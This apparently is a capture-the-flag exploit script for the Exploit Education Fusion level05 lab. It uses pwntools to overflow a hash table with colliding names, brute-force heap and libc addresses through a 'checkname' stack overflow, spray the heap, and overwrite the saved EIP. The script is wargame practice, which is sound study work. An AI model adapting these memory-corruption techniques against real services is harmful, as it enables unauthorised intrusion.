__author__ = '@tomereyz'

import itertools

import requests
from bs4 import BeautifulSoup

from pwn import *


def calc_hash(s):
    h = 0xfee13117
    mask = 128 - 1
    for i, c in enumerate(s):
        h ^= ord(c)

        h += h << 11
        h &= 2 ** 32 - 1

        h ^= h >> 7
        h -= ord(c)
        h &= 2 ** 32 - 1

    h += h << 3
    h &= 2 ** 32 - 1
    h ^= h >> 10

    h += h << 15
    h &= 2 ** 32 - 1

    h -= h >> 17
    h &= 2 ** 32 - 1

    return h & mask
    """
    unsigned int h = 0xfee13117;
    int i;
    
    for(h = 0xfee13117, i = 0; i < length; i++) {
      h ^= str[i];
      h += (h << 11);
      h ^= (h >> 7);
      h -= str[i];
    }
    h += (h << 3);  // h += (h * 2**3  ) // 39)
    h ^= (h >> 10); // h ^= (h / 2**10 ) // 1024)
    h += (h << 15); // h += (h * 2**15 ) // 32768)
    h -= (h >> 17); // h -= (h / 2**17 ) // 131072)
    
    return (h & mask);
    """


def break_hash(r):
    cmd_addreg = 'addreg {name} {flags} {ipv4}'
    hashes = {}
    for s in itertools.permutations(set(string.ascii_uppercase) | set(string.ascii_lowercase) | set(string.digits), 3):
        hashes[calc_hash(s)] = s
        if len(hashes.keys()) == 128:
            break
    for k, v in hashes.items():
        v_str = ''.join(v)
        print 'hash value:', k, 'str:', v_str
        # r.sendline(cmd_addreg.format(name=v_str, flags=str(0), ipv4='1.2.3.4'))  # free: 0x00000403, 0xe0
        # r.sendline(cmd_addreg.format(name=v_str, flags=str(0), ipv4='1.2.0.0'))  # ebx: 0x00000201 free: 0x00000000, 0xe0
        r.sendline(cmd_addreg.format(name=v_str, flags=str(0x03e0), ipv4='1.2.0.0'))  # free: 0x00000000, 0xe0
        r.sendline(cmd_addreg.format(name=v_str, flags=str(0x03e0), ipv4='1.2.0.0'))  # free: 0x00000000, 0xe0
        r.sendline(cmd_addreg.format(name=v_str, flags=str(0x03e0), ipv4='1.2.0.0'))  # free: 0x00000000, 0xe0


def overflow_senddb(r):
    cmd_senddb = 'senddb 192.168.1.51 49567'
    for i in xrange(10):
        time.sleep(3)
        break_hash(r)
    time.sleep(3)
    r.sendline(cmd_senddb)


def leak_fd(r):
    # start_search = 0xba3753a0
    start_search = 0xb50101a0
    offset_esi = 32
    for offset_heap in xrange(0, 0x10000, 4):
        possible_address = start_search - offset_heap
        if (('\n' in struct.pack('I', possible_address)) | ('\r' in struct.pack('I', possible_address)) | (
                '@' in struct.pack('I', possible_address)) | (
                '\x00' in struct.pack('I', possible_address))):
            continue
        log.info('Trying {}'.format(hex(possible_address)))
        payload = cyclic(offset_esi) + pack(possible_address, word_size=32)

        cmd_checkname = 'checkname {}'.format(payload)
        r.sendline(cmd_checkname)
        x = None
        try:
            x = r.recv(timeout=2)
        except Exception as e:
            print e
        if x:
            return possible_address
            # return start_search - offset_heap
        time.sleep(0.1)

    return None


def leak_arg(r, fd_address):
    offset_esi = 32
    offset_edi = 36

    for offset_heap in xrange(0, 0x10000, 4):
        possible_address = fd_address - offset_heap
        if (('\n' in struct.pack('I', possible_address)) | ('\r' in struct.pack('I', possible_address)) | (
                '@' in struct.pack('I', possible_address)) | (
                '\x00' in struct.pack('I', possible_address))):
            continue
        log.info('Trying {}'.format(hex(possible_address)))
        payload = cyclic(offset_esi) + pack(fd_address, word_size=32) + pack(possible_address, word_size=32)
        cmd_checkname = 'checkname {}'.format(payload)
        r.sendline(cmd_checkname)
        x = None
        try:
            x = r.recv(timeout=2)
        except Exception as e:
            print e
        if 'aaaa' in x:
            return possible_address
            # return start_search - offset_heap
        time.sleep(0.1)

    return None


def leak_libc(r, fd_address):
    offset_esi = 32
    offset_edi = 36

    offset_heap = 0
    while True:
        offset_heap += 1
        possible_address = fd_address + offset_heap
        if (('\n' in struct.pack('I', possible_address)) | ('\r' in struct.pack('I', possible_address)) | (
                '@' in struct.pack('I', possible_address)) | (
                '\x00' in struct.pack('I', possible_address))):
            continue
        log.info('Trying {}'.format(hex(possible_address)))
        payload = cyclic(offset_esi) + pack(fd_address, word_size=32) + pack(possible_address, word_size=32)
        cmd_checkname = 'checkname {}'.format(payload)
        r.sendline(cmd_checkname)
        x = None
        try:
            x = r.recv(timeout=2)
        except Exception as e:
            print e
        # taskmain

        return possible_address

        # return start_search - offset_heap
        time.sleep(0.1)

    return None


# 0xb76f8000 0xb773a000    0x42000

def leak(r):
    offset_esi = 32
    offset_edi = 36

    time.sleep(3)
    fd_address = leak_fd(r)
    if not fd_address:
        log.info('Failed to leak fd')
    arg_address = leak_arg(r, fd_address)
    if not arg_address:
        log.info('Failed to leak arg')

    libc_address = leak_libc(r, fd_address)
    if not libc_address:
        log.info('Failed to leak libc')

    print fd_address
    print arg_address
    """
    0xb76f81c0:     0x00000000      0x00000000      0x00000000      0x00000000
    0xb76f81d0:     0x00000000      0x00000000      0x00000000      0x00000000
    0xb76f81e0:     0x00000000      0x00000000      0x00000000      0x00000000
    0xb76f81f0:     0x00000000      0x00000000      0x00000000      0x00000000
    0xb76f8200:     0x00000000      0x00000000      0xb9835110      0x00000000
    0xb76f8210:     0x00000000      0x00000000      0x00000000      0x00000000
    0xb76f8220:     0xb76f83ac      0x00000000      0x0003ffc0      0x00000000
    0xb76f8230:     0x00000000      0x00000000      0x00000000      0xb77382fc
    0xb76f8240:     0xb773828c      0xb77382ec      0xb7738240      0x00000003
    0xb76f8250:     0xb76f83a4      0x00000000      0x00000000      0x00000000
    0xb76f8260:     0x00000000      0xb78e7349      0x00000000      0x00000000
    0xb76f8270:     0x00000000      0x00000000      0xb76f8304      0x00000000
    

    0xb7580000 0xb75c2000    0x42000        0x0 
    0xb75c2000 0xb7738000   0x176000        0x0 /lib/i386-linux-gnu/libc-2.13.so
    0xb7738000 0xb773a000     0x2000   0x176000 /lib/i386-linux-gnu/libc-2.13.so
    0xb773a000 0xb773b000     0x1000   0x178000 /lib/i386-linux-gnu/libc-2.13.so
    0xb773b000 0xb773e000     0x3000        0x0 
    0xb7748000 0xb774a000     0x2000        0x0 
    0xb774a000 0xb774b000     0x1000        0x0 [vdso]
    0xb774b000 0xb7769000    0x1e000        0x0 /lib/i386-linux-gnu/ld-2.13.so
    0xb7769000 0xb776a000     0x1000    0x1d000 /lib/i386-linux-gnu/ld-2.13.so
    0xb776a000 0xb776b000     0x1000    0x1e000 /lib/i386-linux-gnu/ld-2.13.so
    0xb776b000 0xb7771000     0x6000        0x0 /opt/fusion/bin/level05
    0xb7771000 0xb7772000     0x1000     0x6000 /opt/fusion/bin/level05
    0xb7772000 0xb7775000     0x3000        0x0 
    0xb9021000 0xb9042000    0x21000        0x0 [heap]
    0xb9042000 0xbd595000  0x4553000        0x0 [heap]
    0xbf7f5000 0xbf816000    0x21000        0x0 [stack]
 

    """
    # for offset_heap in xrange(0, 0x400, 0x100):
    #     # payload = cyclic(offset_edi) + pack(heap_address - offset_heap, word_size=32)
    #     log.info(hex(heap_address - offset_heap))
    #     payload = cyclic(offset_esi) + pack(fd_address, word_size=32) + pack(heap_address - offset_heap,
    #                                                                               word_size=32)
    #
    #     cmd_checkname = 'checkname {}'.format(payload)
    #     r.sendline(cmd_checkname)
    #     time.sleep(1)
    #     r.sendline(cmd_checkname)


def spary(r, data):
    cmd_isup = 'isup {}'.format(data)
    cmd_exit = 'exit'.format(data)

    time.sleep(2)
    for i in xrange(0x421f6c):
        # time.sleep(0.2)
        r.sendline(cmd_isup)
    r.sendline(cmd_exit)
    time.sleep(2)


def overflow(r, edi, eip):
    offset_edi = 36
    offset_eip = 44
    payload = cyclic(offset_edi) + edi + cyclic(offset_eip - offset_edi) + eip

    cmd_checkname = 'checkname {}'.format(payload)

    """
    ebx            0xb77e111c       0xb77e111c
    esp            0xb9664d70       0xb9664d70
    ebp            0x6161616b       0x6161616b
    esi            0x61616169       0x61616169
    edi            0x6161616a       0x6161616a
    eip            0x6161616c       0x6161616c

    cyclic_find(0x6161616a) == 36 # edi
    cyclic_find(0x6161616c) == 44 # saved eip
    """

    r.sendline(cmd_checkname)
    r.sendline(cmd_checkname)
    time.sleep(3)
    r.sendline(cmd_checkname)
    r.sendline(cmd_checkname)


def main(download):
    challenge_series = 'fusion'
    challenge_name = 'level05'
    challenge_port = 20005
    ssh_client = ssh(user=challenge_series, host=challenge_series, password='godmode')

    if download:
        ssh_client.download('/opt/fusion/bin/{}'.format(challenge_name))

        resp = requests.get('https://exploit.education/fusion/{challenge_name}/'.format(challenge_name=challenge_name))
        bs_obj = BeautifulSoup(resp.content, 'html.parser')
        with open('{challenge_name}.c'.format(challenge_name=challenge_name), 'w') as f:
            f.write(bs_obj.find_all('code', {'class': 'language-c'})[0].text)

    e = ELF(challenge_name)
    r = remote(challenge_series, challenge_port)
    overflow(r, '1111', '2222')
    pause()
    r = remote(challenge_series, challenge_port)
    print r.recv()
    spary(r, data=cyclic(400) + pack(5, word_size=32))

    r = remote(challenge_series, challenge_port)
    print r.recv()
    leak(r)
    # overflow(r, edi='AAAA', eip='BBBB')
    r.interactive()

    """
    hash(name, length, mask)
        fish -> 0x6c
    """


if __name__ == '__main__':
    main(download=False)
